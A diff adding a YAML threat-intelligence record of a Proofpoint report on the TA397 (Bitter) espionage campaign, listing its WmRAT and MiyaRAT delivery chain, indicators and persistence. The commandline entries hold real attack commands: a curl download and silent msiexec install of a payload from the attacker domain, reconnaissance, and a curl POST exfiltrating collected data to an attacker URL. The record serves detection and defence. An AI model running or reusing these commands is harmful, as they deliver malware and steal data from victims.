@@ -1,0 +1,74 @@
+summary: TA397 targeted a Turkish defense sector organization with a lure about public
+  infrastructure projects in Madagascar, using alternate data streams in a RAR archive
+  to deliver a shortcut (LNK) file and subsequently deploying WmRAT and MiyaRAT malware
+  for intelligence gathering and exfiltration.
+date: November 18, 2024
+authors:
+- Proofpoint
+attribution: TA397 (Bitter), South Asian government interests
+malware_families:
+- WmRAT
+- MiyaRAT
+TTPs:
+  processs:
+  - cmd.exe
+  - powershell.exe
+  - curl.exe
+  - msiexec.exe
+  - anvrsa.msi
+  - gfxview.msi
+  - xrgtg.exe
+  commandline:
+  - cmd /k "cmd < ~tmp.pdf:Participation & exit"
+  - curl -o C:\\users\\public\\music\\gfxview[.]msi http://jacknwoods[.]com/gfxview[.]msi
+  - msiexec /i C:\\users\\public\\music\\gfxview.msi /qn /norestart
+  - cmd < ~tmp.pdf:Participation & exit
+  - cd C:\\programdata dir >> abc[.]pdf
+  - tasklist >> abc[.]pdf
+  - wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName
+    >> abc[.]pdf
+  - cmd /c curl -X POST -F "file=[@]C:\\programdata\\abc[.]pdf" hxxps[:]//www[.]jacknwoods[.]com/chthuo[.]php?ain=%computername%_%username%
+  - del abc[.]pdf
+  powershell:
+  - Decoded PowerShell command
+  scripting_engine: []
+  registry_keys: []
+  network_connections:
+  - process: curl.exe
+    port: 47408
+    destination: jacknwoods[.]com
+  - process: curl.exe
+    port: null
+    destination:
+    - jacknwoods[.]com
+  - process: curl.exe
+    port: 443
+    destination:
+    - www[.]jacknwoods[.]com
+  - process: curl.exe
+    port: 443
+    destination:
+    - microsoft[.]com
+  file_modifications:
+  - C:\\users\\public\\music\\gfxview[.]msi
+  - C:\\programdata\\abc[.]pdf
+  persistence:
+  - Scheduled Task: DsSvcCleanup
+  pipes: []
+  process_relations: []
+IOCs:
+  hashes: []
+  ips:
+  - 185.244.151[.]84
+  - 38.180.142[.]228
+  - 96.9.215[.]155
+  domains:
+  - jacknwoods[.]com
+  - academymusica[.]com
+  - samsnewlooker[.]com
+  urls:
+  - hxxp[:]//jacknwoods[.]com/jacds[.]php?jin=%computername%_%username%
+  - hxxps[:]//www[.]jacknwoods[.]com/chthuo[.]php?ain=%computername%_%username%
+  - hxxp[:]//jacknwoods[.]com/gfxview[.]msi
+reference: https://www.proofpoint.com/us/blog/threat-insight/hidden-plain-sight-ta397s-new-attack-chain-delivers-espionage-rats
+file_creation_date: May 09, 2025
